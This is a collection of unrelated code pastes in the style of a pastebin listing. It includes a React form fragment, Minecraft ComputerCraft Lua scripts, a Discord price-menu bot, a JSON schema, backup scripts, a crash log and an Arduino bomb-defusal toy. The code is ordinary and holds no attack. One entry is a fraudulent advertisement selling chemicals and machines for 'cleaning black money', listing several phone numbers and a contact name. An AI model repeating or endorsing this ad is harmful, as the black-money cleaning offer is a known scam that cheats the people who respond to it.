                                                        alt={t('articles.createForm.sectionWithNumber', { number: index + 1 })}
                                                        onClick={() => handleImageClick(section.image.src)}
                                                    />
                                                    <button
                                                        type=""button""
                                                        className=""remove-image-btn""
                                                        onClick={() => removeSectionImage(index)}
                                                    >
                                                        <FontAwesomeIcon icon={faTimes} />
                                                    </button>
                                                </div>
                                            )}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>

                {/* –¢–∞–≥–æ–≤–µ */}
                <div className=""form-section"">
                    <h3>{t('articles.createForm.tags')}</h3>
                    <div className=""form-section-content"">
                        <div className=""tags-container"">
                            <div className=""tags-input-group"">
                                <input
                                    type=""text""
                                    id=""newTag""
                                    value={newTag}
                                    onChange={(e) => setNewTag(e.target.value)}
                                    placeholder={t('articles.createForm.tagPlaceholder')}
                                    onKeyPress={(e) => e.key === 'Enter' && handleTagAdd(e)}
                                />
                                <button
                                    type=""button""
                                    className=""add-tag-btn""
                                    onClick={handleTagAdd}
                                >
                                    <FontAwesomeIcon icon={faPlus} /> {t('articles.createForm.addBtn')}
                                </button>
                            </div>

                            {errors.tags && <div className=""error-message"">{errors.tags}</div>}

                            <div className=""tags-list"">
                                {values.tags.map((tag, index) => (
                                    <div key={index} className=""tag-item"">
                                        <span>{tag}</span>
                                        <button
                                            type=""button""
                                            onClick={() => removeTag(index)}
                                            className=""remove-tag-btn""
                                        >
                                            <FontAwesomeIcon icon={faTimes} />
                                        </button>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </div>
                </div>

                {/* –ü—Ä–æ–≥—Ä–µ—Å –ø—Ä–∏ –∫–∞—á–≤–∞–Ω–µ */}
                {isUploading && (
                    <div className=""upload-progress"">
                        <div className=""progress-bar"">
                            <div className=""progress-fill"" style={{ width: `${uploadProgress}%` }}></div>
                        </div>
                        <span>{uploadProgress.toFixed(0)}% {t('articles.createForm.uploaded')}</span>
                    </div>
                )}

                {/* –ë—É—Ç–æ–Ω–∏ –Ω–∞ —Ñ–æ—Ä–º–∞—Ç–∞ */}
                <div className=""form-actions"">
                    <button
                        type=""button""
                        className=""preview-btn""
                        onClick={handlePreviewToggle}
                    >
                        <FontAwesomeIcon icon={faEye} />  {t('articles.createForm.previewBtn')}
                    </button>

                    <button
                        type=""submit""
                        className=""submit-btn""
                        disabled={isUploading}
                    >
                        <FontAwesomeIcon icon={faSave} /> {submitButtonText}
                    </button>
                </div>
            </form>

            {/* –ú–æ–¥–∞–ª–µ–Ω –ø—Ä–æ–∑–æ—Ä–µ—Ü –∑–∞ –ø—Ä–µ–≥–ª–µ–¥ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤ –ø—ä–ª–µ–Ω —Ä–∞–∑–º–µ—Ä */}
            {expandedImageUrl && (
                <div className=""image-modal"" onClick={closeExpandedImage}>
                    <div className=""image-modal-content"">
                        <img src={expandedImageUrl} alt={t('articles.createForm.expandedView')} />
                        <button className=""close-modal-btn"" onClick={closeExpandedImage}>
                            <FontAwesomeIcon icon={faTimes} />
                        </button>
                    </div>
                </div>
            )}
            <ScrollToTop />
            {/* –í –∫—Ä–∞—è –Ω–∞ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞, –ø—Ä–µ–¥–∏ –ø–æ—Å–ª–µ–¥–Ω–∏—è –∑–∞—Ç–≤–∞—Ä—è—â —Ç–∞–≥ */}
            <ImageAltEditModal
                isOpen={isAltModalOpen}
                onClose={() => setIsAltModalOpen(false)}
                image={currentEditingImage.image}
                onSave={handleSaveImageInfo}
            />
        </div>
    );
});

export default ArticleCreateForm;
"
jyTPqg3b,Activation powder/ vectro paste for cleaning all currencies in GCC +971528015175,Angwa,CSS,Monday 9th of June 2025 10:26:51 AM CDT,"
SSD Chemical Solution For Cleaning Black Money, Activation Powder, Auto cleaning machine, etc Call +971586162753 / +971526949761 / +971528015175 / +971529837514 / +97451131599 Dr. Ali Ibrahim ‚úîÔ∏è
 We have all kinds of chemicals used for cleaning black money or stained money in currencies such as the U.S. dollar, Euro, the Pound, and all local currencies, even if your defaced note is 25 years old. All our chemicals are sold with a manual guide that provides instructions on how to use the chemical to perform the cleaning for those who don't know how to do it. Our technicians are also available to meet and give buyers a helping hand to clean their notes. Cleaning Machine is also available for customers who need a cleaning Machine for maximum cleaning. Feel free to contact us with any questions, and we will reply to you within 24 hours. Contact us directly at our email address, which is +971586162753 / +971526949761 / +971528015175 / +971529837514 / +97451131599 Dr. Ali Ibrahim ‚úîÔ∏è"
SzTASk8z,CC Room,Dima99,Lua,Monday 9th of June 2025 10:15:11 AM CDT,"-- for Minecraft (ComputerCraft mod)

-- config & start

local chestsSlot = 16
local delay = 0

local distance = 0
local side = 'r'
local useChests = true
local height = 1
local goDown = false
local autoStart = false

local function setStart(args) -- [dist] <side> <chests> <auto start> <height)>
    if #args == 0 then
        return false
    end
    
    if tonumber(args[1]) == nil then
        return false
    else
        distance = args[1]
    end
    
    for i = 2, #args do
        a = args[i]
        
        h = tonumber(a)
        if h ~= nil then
            if h < 0 then
                goDown = true
            end
        height = math.abs(h)
            
        elseif a == 'l' or a == 'r' then
            side = a
        elseif a == 'c' then
            useChests = false
        elseif a == 's' then
            autoStart = true
        elseif a == 'u' then
            goDown = true
        end
        
    end
    
    return true

end

local function showWarn()
    print(""Error"")
    print(""Digs a box with horizontal edge lenght [d]"")
    print(""Usage: "" .. shell.getRunningProgram() .. "" [d] <l/r> <c> <s> <n>"")
    print(""d - hor. edge lenght"")
    print(""l/r - left/right"")
    print(""c - disable inventory management"")
    print(""s - silent start"")
    print(""n - number = height/3"")
    print(""u - go down [goes up by default]"")
end

local function writeStat(done, total)
    term.clear()
    term.setCursorPos(1,1)
    done = math.ceil(done/total * 100)
    print(""Progress ""..done..""%"")
end

-- core

local function clearInv()
    if not useChests then
        return
    end
    
    for i = 1, 16 do
        if turtle.getItemCount(i) == 0 then
            return
        end
    end
    
    local backupSlot = turtle.getSelectedSlot()
    
    turtle.select(chestsSlot)
    turtle.placeDown()
    for i = 1, 16 do
        if i ~= chestsSlot then
            turtle.select(i)
            turtle.dropDown()
        end
    end
    
    turtle.select(backupSlot)    
end

local function safeDigUp(s)
    while turtle.detectUp() do
        turtle.digUp()
        if not (s == 0 or s == nil) then
            sleep(s)
        end
    end
end

local function step(s)
    while turtle.detect() do
        turtle.dig()
        if not (s == 0 or s == nil) then
            sleep(s)
        end
    end
    
    safeDigUp(s)
    
    if turtle.detectDown() then
        turtle.digDown()
    end
    
    clearInv()
    
    while not turtle.forward() do
        sleep(1)
    end
    
    cntr = cntr + 1
    
    return true
end

local function line(l)
    for i = 1, l do
        step(delay)
        writeStat(cntr, totalDist)        
    end
end

local function tTurn(inverted)
    inv = inverted or false
    if side == 'l' or side == 'L' then
        if not inv then
            turtle.turnLeft()
        else
            turtle.turnRight()
        end
    end
    if side == 'r' or side == 'R' then
        if not inv then
            turtle.turnRight()
        else
            turtle.turnLeft()
        end
    end
end

local function room()
    
    distLeft = distance - 1
    
    while distLeft >= 1 do
        line(distLeft)
        tTurn()
        line(distLeft)
        tTurn()
        line(distLeft)
        tTurn()
        distLeft = distLeft - 1
        line(distLeft)
        tTurn()
        if distLeft >= 1 then
            line(1)
        end
        distLeft = distLeft - 1
    end
    turtle.digDown()
    safeDigUp(delay)
end

local function home()
    if cntr == 1 then
        return
    end
    
    for i = 1, math.floor( (distance-1)/2) do
        turtle.back()
    end
    tTurn()
    for i = 1, math.floor( distance/2 ) do
        turtle.back()
    end
    tTurn(true)
    
    if goDown then
        turtle.down()
        turtle.digDown()
        turtle.down()
        turtle.digDown()
        turtle.down()
    else
        turtle.up()
        safeDigUp(delay)
        turtle.up()
        safeDigUp(delay)
        turtle.up()
    end
end

local function returnToStart()
    for i = 1, math.floor( (distance-1)/2) do
        turtle.back()
    end
    tTurn()
    for i = 1, math.floor( distance/2 ) do
        turtle.back()
    end
    tTurn(true)
    for i = 1, (height-1)*3 do
        if goDown then
            turtle.up()
        else
            turtle.down()
        end
    end
end

-- main

args = { ... }
cntr = 1

if not setStart(args) then
    showWarn()
    return
end

if useChests then
    if turtle.getItemCount(chestsSlot) == 0 then
        print(""No chests found. Some loot may be lost. Proceed anyway? (y)"")
        q = read()
        if not (q == ""y"" or q == ""Y"") then
            return
        end
    end
end

totalDist = distance * distance * height + ((height-1) * 3) + 
(math.floor( (distance-1)/2) + math.floor( distance/2 )) * (height-1)

print(""Fuel: ""..turtle.getFuelLevel().."" / ""..totalDist)

if turtle.getFuelLevel() < totalDist then
    print(""\n\nNot enought fuel.\nProgram will be aborted"")
    return nil
else
    print("" ...OK"")
end

if not useChests then
    print(""Inventory management disabled"")
end

if not autoStart then
    print(""\nPress <Enter> to start""..""\n""..""Or hold <Ctrl + T> to abort"")
    read()
end

for i = 1, height do
    home()
    room()
end

returnToStart()

term.clear()
term.setCursorPos(1, 1)
print(""Done!""..""\n""..""Total steps: ""..tostring(cntr))"
LKv8Q59b,Untitled,BETAlwrd,JavaScript,Monday 9th of June 2025 10:07:58 AM CDT,"const {Client} = require('discord.js');
const bigo_bot=new Client({intents: [1, 512, 32768]});
const bigo_tok=""token"";// ŸáŸÜÿß ÿ≠ÿ∑ ÿ™ŸàŸÉŸÜ
const bigo_cha=""roomid"";// ŸáŸÜÿß ÿ≠ÿ∑ ÿßŸäÿØŸä ÿßŸÑÿ±ŸàŸÖ
bigo_bot.on('ready', async () => {
    const bigo_emb = {
        title: 'ÿßÿÆÿ™ÿ± ŸÖŸÜ ÿßŸÑŸÇÿßÿ¶ŸÖÿ©:',
        image: {
            url: 'https://media.discordapp.net/attachments/1376436257277743104/1381647964023291985/Screenshot_2.png'// ŸáŸÜÿß ÿ™ŸÉÿØÿ± ÿ™ÿ®ÿØŸÑ ÿßŸÑÿµŸàÿ±Ÿá ŸÖÿßŸÑÿ™ ÿßŸÑÿßŸäŸÖÿ®ÿØ
        },
        color: 0x000000
    };

    const bigo_row_1 = {
        type: 3,
        custom_id: 'options_menu',
        placeholder: 'ÿßÿÆÿ™ÿ± ŸÑŸÖÿπÿ±ŸÅÿ© ÿßŸÑÿ≥ÿπÿ±',
        options: [
            {
                label: 'ŸÜŸÄŸäŸÄÿ™ŸÄÿ±Ÿà ŸÇŸÄŸäŸÄŸÖŸÄŸÜŸÄŸÇ',
                description: 'ÿßÿ∂ÿ∫ÿ∑ ŸÑŸÖÿπÿ±ŸÅÿ© ÿßÿ≥ÿπÿßÿ± ÿßŸÑŸÜŸäÿ™ÿ±ŸàŸáÿßÿ™',
                value: '_bigo_nitro'
            },
            {
                label: 'ÿ≥ŸÄŸäŸÄÿ±ŸÅŸÄŸÄÿ± ÿ®ŸÄŸàÿ≥ŸÄÿ™',
                description: 'ÿßÿ∂ÿ∫ÿ∑ ŸÑŸÖÿπÿ±ŸÅÿ© ÿßÿ≥ÿπÿßÿ± ÿßŸÑÿ®Ÿàÿ≥ÿ™ÿßÿ™',
                value: '_bigo_boost'
            }
        ]
    };

    const bigo_row = {
        type: 1,
        components: [bigo_row_1]
    };


(await bigo_bot.channels.fetch(bigo_cha))?.send({embeds: [bigo_emb],components: [bigo_row]}).catch(() => console.error(""room id plz""));  

});

bigo_bot.on('interactionCreate', async (interaction) => {
    if (!interaction.isStringSelectMenu()) return;
    if (interaction.customId !== 'options_menu') return;
    let bigo_emb_1;
    switch (interaction.values[0]) {
        case '_bigo_nitro':
            bigo_emb_1 = {
                title: 'ŸÜŸÄŸäŸÄÿ™ŸÄÿ±Ÿà ŸÇŸÄŸäŸÄŸÖŸÄŸÜŸÄŸÇ',
                description: 'ÿ¥Ÿáÿ± ŸÇŸäŸÅÿ™: xx$\nÿ≥ŸÜŸá ŸÇŸäŸÅÿ™: xx$',
                image: {
                    url: 'https://media.discordapp.net/attachments/1376436257277743104/1381647964023291985/Screenshot_2.png'// ŸáŸÜÿß ÿ™ŸÉÿØÿ± ÿ™ÿ®ÿØŸÑ ÿµŸàÿ±ÿ© ŸÖŸÉÿßŸÜ ÿßŸÑŸÜŸäÿ™ÿ±Ÿà
                },
                color: 0x000000
            };
            break;

        case '_bigo_boost':
            bigo_emb_1 = {
                title: 'ÿ≥ŸÄŸäŸÄÿ±ŸÅŸÄŸÄÿ± ÿ®ŸÄŸàÿ≥ŸÄÿ™',
                description: '14 ÿ®Ÿàÿ≥ÿ™ ÿ¥Ÿáÿ±: xx$\n14 ÿ®Ÿàÿ≥ÿ™ 3 ÿ¥ŸáŸàÿ±: xx$',
                image: {
                    url: 'https://media.discordapp.net/attachments/1376436257277743104/1381647964023291985/Screenshot_2.png'// ŸáŸÜÿß ÿ™ŸÉÿØÿ± ÿ™ÿ®ÿØŸÑ ÿµŸàÿ±ÿ© ŸÖŸÉÿßŸÜ ÿßŸÑÿ®Ÿàÿ≥ÿ™
                },
                color: 0x000000
            };
            break;
    }

    await interaction.reply({
        embeds: [bigo_emb_1],
        ephemeral: true
    });
});

bigo_bot.login(bigo_tok).then(() => console.log(""BIGO -""+bigo_bot.user.tag)).catch(e => console.error(e));"
XTtB3ytg,Untitled,boolit,Python,Monday 9th of June 2025 10:03:53 AM CDT,"{
  ""entities"": [
    {
      ""id"": ""entity_1"",
      ""name"": ""–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è"",
      ""tables"": [
        {
          ""templateName"": ""–û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"",
          ""columns"": [
            {
              ""name"": ""–ù–∞–∑–≤–∞–Ω–∏–µ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏"",
              ""key"": ""orgName"",
              ""type"": ""text"",
              ""required"": true
            },
            {
              ""name"": ""–ö–æ–¥ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏"",
              ""key"": ""orgCode"",
              ""type"": ""text"",
              ""required"": true
            }
          ]
        }
      ],
      ""relatedEntities"": [""entity_2""]
    },
    {
      ""id"": ""entity_2"",
      ""name"": ""–ú–µ—Å—Ç–æ—Ä–æ–∂–¥–µ–Ω–∏–µ"",
      ""tables"": [
        {
          ""templateName"": ""–û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"",
          ""columns"": [
            {
              ""name"": ""–ù–∞–∑–≤–∞–Ω–∏–µ –º–µ—Å—Ç–æ—Ä–æ–∂–¥–µ–Ω–∏—è"",
              ""key"": ""fieldName"",
              ""type"": ""text"",
              ""required"": true
            },
            {
              ""name"": ""–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã"",
              ""key"": ""coordinates"",
              ""type"": ""text"",
              ""required"": false
            }
          ]
        }
      ],
      ""parentEntity"": ""entity_1"",
      ""relatedEntities"": [""entity_3""]
    },
    {
      ""id"": ""entity_3"",
      ""name"": ""–ö—É—Å—Ç"",
      ""tables"": [
        {
          ""templateName"": ""–û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"",
          ""columns"": [
            {
              ""name"": ""–ù–æ–º–µ—Ä –∫—É—Å—Ç–∞"",
              ""key"": ""clusterNumber"",
              ""type"": ""text"",
              ""required"": true
            },
            {
              ""name"": ""–î–∞—Ç–∞ –≤–≤–æ–¥–∞ –≤ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—é"",
              ""key"": ""commissioningDate"",
              ""type"": ""date"",
              ""required"": false
            }
          ]
        }
      ],
      ""parentEntity"": ""entity_2"",
      ""relatedEntities"": [""entity_4""]
    },
    {
      ""id"": ""entity_4"",
      ""name"": ""–°–∫–≤–∞–∂–∏–Ω–∞"",
      ""tables"": [
        {
          ""templateName"": ""–û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"",
          ""columns"": [
            {
              ""name"": ""–ù–æ–º–µ—Ä —Å–∫–≤–∞–∂–∏–Ω—ã"",
              ""key"": ""wellNumber"",
              ""type"": ""text"",
              ""required"": true
            },
            {
              ""name"": ""–ì–ª—É–±–∏–Ω–∞"",
              ""key"": ""depth"",
              ""type"": ""number"",
              ""required"": false
            }
          ]
        }
      ],
      ""parentEntity"": ""entity_3"",
      ""relatedEntities"": [""entity_5"", ""entity_6""]
    },
    {
      ""id"": ""entity_5"",
      ""name"": ""–°—Ç–≤–æ–ª"",
      ""tables"": [
        {
          ""templateName"": ""–û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"",
          ""columns"": [
            {
              ""name"": ""–ù–æ–º–µ—Ä —Å—Ç–≤–æ–ª–∞"",
              ""key"": ""boreholeNumber"",
              ""type"": ""text"",
              ""required"": true
            },
            {
              ""name"": ""–î–∏–∞–º–µ—Ç—Ä"",
              ""key"": ""diameter"",
              ""type"": ""number"",
              ""required"": false
            }
          ]
        }
      ],
      ""parentEntity"": ""entity_4"",
      ""relatedEntities"": [""entity_6"", ""entity_9""]
    },
    {
      ""id"": ""entity_6"",
      ""name"": ""–ü—Ä–æ–±–∞"",
      ""tables"": [
        {
          ""templateName"": ""–û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"",
          ""columns"": [
            {
              ""name"": ""–ù–æ–º–µ—Ä –ø—Ä–æ–±—ã"",
              ""key"": ""sampleNumber"",
              ""type"": ""text"",
              ""required"": true
            },
            {
              ""name"": ""–î–∞—Ç–∞ –æ—Ç–±–æ—Ä–∞"",
              ""key"": ""samplingDate"",
              ""type"": ""date"",
              ""required"": true
            },
            {
              ""name"": ""–¢–∏–ø –ø—Ä–æ–±—ã"",
              ""key"": ""sampleType"",
              ""type"": ""text"",
              ""required"": false
            }
          ]
        }
      ],
      ""parentEntity"": null, // –ú–æ–∂–µ—Ç –±—ã—Ç—å –ø—Ä–∏–≤—è–∑–∞–Ω–∞ –∫ —Å–∫–≤–∞–∂–∏–Ω–µ –∏–ª–∏ —Å—Ç–≤–æ–ª—É
      ""relatedEntities"": [""entity_7"", ""entity_9""]
    },
    {
      ""id"": ""entity_7"",
      ""name"": ""–í—Ç–æ—Ä–∏—á–Ω–∞—è –ø—Ä–æ–±–∞"",
      ""tables"": [
        {
          ""templateName"": ""–û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"",
          ""columns"": [
            {
              ""name"": ""–ù–æ–º–µ—Ä –≤—Ç–æ—Ä–∏—á–Ω–æ–π –ø—Ä–æ–±—ã"",
              ""key"": ""subsampleNumber"",
              ""type"": ""text"",
              ""required"": true
            },
            {
              ""name"": ""–î–∞—Ç–∞ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∏"",
              ""key"": ""preparationDate"",
              ""type"": ""date"",
              ""required"": true
            }
          ]
        }
      ],
      ""parentEntity"": ""entity_6"",
      ""relatedEntities"": [""entity_8""]
    },
    {
      ""id"": ""entity_8"",
      ""name"": ""–ò—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è"",
      ""tables"": [
        {
          ""templateName"": ""–û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"",
          ""columns"": [
            {
              ""name"": ""–ù–æ–º–µ—Ä –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è"",
              ""key"": ""researchNumber"",
              ""type"": ""text"",
              ""required"": true
            },
            {
              ""name"": ""–î–∞—Ç–∞ –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è"",
              ""key"": ""researchDate"",
              ""type"": ""date"",
              ""required"": true
            },
            {
              ""name"": ""–ú–µ—Ç–æ–¥ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è"",
              ""key"": ""researchMethod"",
              ""type"": ""text"",
              ""required"": false
            }
          ]
        }
      ],
      ""parentEntity"": null, // –ú–æ–∂–µ—Ç –±—ã—Ç—å –ø—Ä–∏–≤—è–∑–∞–Ω–æ –∫ —Ä–∞–∑–Ω—ã–º –æ–±—ä–µ–∫—Ç–∞–º
      ""relatedEntities"": [""entity_9""]
    },
    {
      ""id"": ""entity_9"",
      ""name"": ""–ü–∞—Ä–∞–º–µ—Ç—Ä"",
      ""tables"": [
        {
          ""templateName"": ""–†–µ–∑—É–ª—å—Ç–∞—Ç—ã –∏–∑–º–µ—Ä–µ–Ω–∏–π"",
          ""columns"": [
            {
              ""name"": ""–ù–∞–∏–º–µ–Ω–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞"",
              ""key"": ""parameterName"",
              ""type"": ""text"",
              ""required"": true
            },
            {
              ""name"": ""–ó–Ω–∞—á–µ–Ω–∏–µ"",
              ""key"": ""value"",
              ""type"": ""number"",
              ""required"": true
            },
            {
              ""name"": ""–ï–¥–∏–Ω–∏—Ü–∞ –∏–∑–º–µ—Ä–µ–Ω–∏—è"",
              ""key"": ""unit"",
              ""type"": ""text"",
              ""required"": true
            }
          ]
        }
      ],
      ""parentEntity"": ""entity_8""
    }
  ]
}"
YR5bTYdF,Untitled,PlebCoder1337,Bash,Monday 9th of June 2025 09:52:24 AM CDT,"#!/usr/bin/env python3
""""""
verify_backup.py  ‚Äì  Ensure the newest tar.gz in ~/backup_demo/archives can be listed.
If corrupt, exits with code 1 so cron can alert.
""""""
import subprocess, pathlib, sys, os, glob, datetime

ARCHIVE_DIR = pathlib.Path.home() / ""backup_demo"" / ""archives""
archives = sorted(ARCHIVE_DIR.glob(""backup-*.tar.gz""))
if not archives:
    print(""No archives found!"", file=sys.stderr); sys.exit(1)

latest = archives[-1]
print(f""[+] Verifying {latest.name}"")

# `tar -tzf` lists contents ‚Äî exits non‚Äëzero if archive is bad
result = subprocess.run(
    [""tar"", ""-tzf"", latest], capture_output=True, text=True)

if result.returncode == 0:
    print(""[+] Archive OK, sample listing:"")
    print(result.stdout.splitlines()[:3])   # show first 3 files
else:
    print(""[!] Archive appears corrupt!"", file=sys.stderr)
    sys.exit(1)
"
8EuvJrik,LevelClient,PremiumSoldat,Lua,Monday 9th of June 2025 09:51:59 AM CDT,"local modemSide = ""left""
rednet.open(modemSide)

local MASTER_ID = 1 -- √§ndern je nach Computer-ID des Masters
local currentVersion = ""0.0.0""

-- Anfrage senden
rednet.send(MASTER_ID, {
    type = ""checkForUpdate"",
    version = currentVersion
})

local timeout = 5
local timer = os.startTimer(timeout)

while true do
    local event, p1, p2 = os.pullEvent()
    if event == ""rednet_message"" then
        local id, msg = p1, p2
        if id == MASTER_ID and type(msg) == ""table"" then
            if msg.type == ""update"" then
                print(""Update empfangen: Version "" .. msg.version)
                local f = fs.open(msg.filename, ""w"")
                f.write(msg.code)
                f.close()
                currentVersion = msg.version
                shell.run(msg.filename)
                break
            elseif msg.type == ""noUpdate"" then
                print(""Bereits aktuell."")
                break
            end
        end
    elseif event == ""timer"" and p1 == timer then
        print(""Timeout beim Warten auf Antwort vom Master."")
        break
    end
end"
6sbGmUty,Untitled,PlebCoder1337,CSS,Monday 9th of June 2025 09:49:55 AM CDT,"#!/usr/bin/env bash
#
# backup.sh  ‚Äì  Full tar.gz backup of ~/backup_demo/source
#   1. Creates timestamped archive in ~/backup_demo/archives
#   2. Keeps only the latest 7 archives (rotate)
#
set -e                          # Exit on first error

SRC_DIR=""$HOME/backup_demo/source""
DST_DIR=""$HOME/backup_demo/archives""

# Create destination if missing
mkdir -p ""$DST_DIR""

# Build archive name: backup-YYYYMMDD-HHMMSS.tar.gz
STAMP=$(date +'%Y%m%d-%H%M%S')
ARCHIVE=""$DST_DIR/backup-${STAMP}.tar.gz""

# -c = create    -z = gzip    -f = file name
tar -czf ""$ARCHIVE"" -C ""$SRC_DIR"" .    # -C changes dir before adding ‚Äú.‚Äù

echo ""[+] Created $ARCHIVE""

# -------- Rotation: keep only latest 7 archives --------
# List files sorted by newest first, skip first 7, delete the rest
ls -1t ""$DST_DIR""/backup-*.tar.gz | tail -n +8 | xargs -r rm -v

exit 0
"
UFDMS6Wt,LevelMaster,PremiumSoldat,Lua,Monday 9th of June 2025 09:49:39 AM CDT,"local modemSide = ""left""
rednet.open(modemSide)

local latestVersion = ""1.0.0""
local filename = ""client_program.lua""

-- Code einlesen
local function getProgramCode()
    local f = fs.open(filename, ""r"")
    local code = f.readAll()
    f.close()
    return code
end

print(""Master bereit ‚Äì warte auf Anfragen..."")

while true do
    local senderId, msg = rednet.receive()
    if type(msg) == ""table"" and msg.type == ""checkForUpdate"" then
        print(""Client "" .. senderId .. "" pr√ºft Version: "" .. msg.version)
        local function split(v) return {string.match(v, ""(%d+)%.(%d+)%.(%d+)"")} end
        local a, b = split(latestVersion), split(msg.version)
        local newer = false
        for i = 1, 3 do
            if tonumber(a[i]) > tonumber(b[i]) then newer = true break end
            if tonumber(a[i]) < tonumber(b[i]) then break end
        end

        if newer then
            rednet.send(senderId, {
                type = ""update"",
                version = latestVersion,
                filename = filename,
                code = getProgramCode()
            })
            print(""Update gesendet an "" .. senderId)
        else
            rednet.send(senderId, { type = ""noUpdate"" })
            print(""Kein Update n√∂tig f√ºr "" .. senderId)
        end
    end
end"
FLZXcMEQ,2025-06-09T17:31:27.501,powerampache,PHP,Monday 9th of June 2025 09:31:27 AM CDT,"1.00-64 (64) - DB: 82
java.lang.NullPointerException
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleEverything(SongsRepositoryImpl.kt:593)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleEverything(SongsRepositoryImpl.kt:77)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleEverything$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:108)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:793)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:697)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:684)

"
8MNCXASc,Untitled,bitwise_gamgee,C,Monday 9th of June 2025 09:20:21 AM CDT,"#include ""Arduino.h""
#define ARMED_LIGHT_PIN 12 
#define DISARM_CIRCUIT_PIN 2
#define EXPLODE_BUZZER_PIN 8
#define WRONG_WIRE_PIN 7    

// Game state
bool isArmed = true;        // True if bomb is armed
bool hasExploded = false;   // True if wrong wire cut

// Debouncing variables
const unsigned long DEBOUNCE_DELAY = 50; // Debounce time (ms)
unsigned long lastDisarmDebounceTime = 0;
unsigned long lastWrongWireDebounceTime = 0;
int lastDisarmState = HIGH;  // Last stable state of disarm pin
int lastWrongWireState = HIGH; // Last stable state of wrong wire pin

/*
 * Initializes pins and sets initial game state.
 * - Sets LED and buzzer as outputs.
 * - Sets circuit pins as inputs with internal pull-up resistors (HIGH when open, LOW when grounded).
 * - Turns on armed LED to indicate game start.
 */
void setup() {
  pinMode(ARMED_LIGHT_PIN, OUTPUT);
  pinMode(DISARM_CIRCUIT_PIN, INPUT_PULLUP);
  pinMode(EXPLODE_BUZZER_PIN, OUTPUT);
  pinMode(WRONG_WIRE_PIN, INPUT_PULLUP);
  digitalWrite(ARMED_LIGHT_PIN, HIGH); // BOMB IS ARMED INITIALLY
}

/*
 * Reads and debounces circuit inputs.
 * - Reads current state of disarm and wrong wire pins.
 * - If state changes, starts debounce timer.
 * - After debounce delay, updates stable state.
 * - Returns true if either pin's stable state is LOW (wire cut).
 */
bool readInputs(int &disarmState, int &wrongWireState) {
  int currentDisarmState = digitalRead(DISARM_CIRCUIT_PIN);
  int currentWrongWireState = digitalRead(WRONG_WIRE_PIN);
  
  if (currentDisarmState != lastDisarmState) {
    lastDisarmDebounceTime = millis();
  }
  if (millis() - lastDisarmDebounceTime > DEBOUNCE_DELAY) {
    disarmState = currentDisarmState;
  }
  
  if (currentWrongWireState != lastWrongWireState) {
    lastWrongWireDebounceTime = millis();
  }
  if (millis() - lastWrongWireDebounceTime > DEBOUNCE_DELAY) {
    wrongWireState = currentWrongWireState;
  }
  
  lastDisarmState = currentDisarmState;
  lastWrongWireState = currentWrongWireState;
  
  return (disarmState == LOW || wrongWireState == LOW);
}

/*
 * Updates game state based on inputs.
 * - If bomb is armed and hasn't exploded:
 *   - Disarm if correct wire is cut (disarmState LOW).
 *   - Explode if wrong wire is cut (wrongWireState LOW).
 * - Locks game after disarming or exploding.
 */
 
void updateGameState(int disarmState, int wrongWireState) {
  if (isArmed && !hasExploded) {
    if (disarmState == LOW) {
      isArmed = false; // Bomb disarmed
    } else if (wrongWireState == LOW) {
      hasExploded = true; // Bomb exploded
    }
  }
}

/*
 * Updates LED and buzzer based on game state.
 * - Armed: LED on, buzzer off.
 * - Disarmed: LED off, buzzer off.
 * - Exploded: LED off (or flashes), buzzer on.
 */
 
void updateOutputs() {
  if (isArmed && !hasExploded) {
    digitalWrite(ARMED_LIGHT_PIN, HIGH); // Armed: LED on
    noTone(EXPLODE_BUZZER_PIN);          // Buzzer off
  } else if (!isArmed) {
    digitalWrite(ARMED_LIGHT_PIN, LOW);  // Disarmed: LED off
    noTone(EXPLODE_BUZZER_PIN);          // Buzzer off
  } else if (hasExploded) {
    digitalWrite(ARMED_LIGHT_PIN, LOW);  // Exploded: LED off
    tone(EXPLODE_BUZZER_PIN, 500);       // Buzzer on (500 Hz)
    // Optional: Flash LED
    // digitalWrite(ARMED_LIGHT_PIN, (millis() / 250) % 2);
  }
}

/*
 * Main game loop.
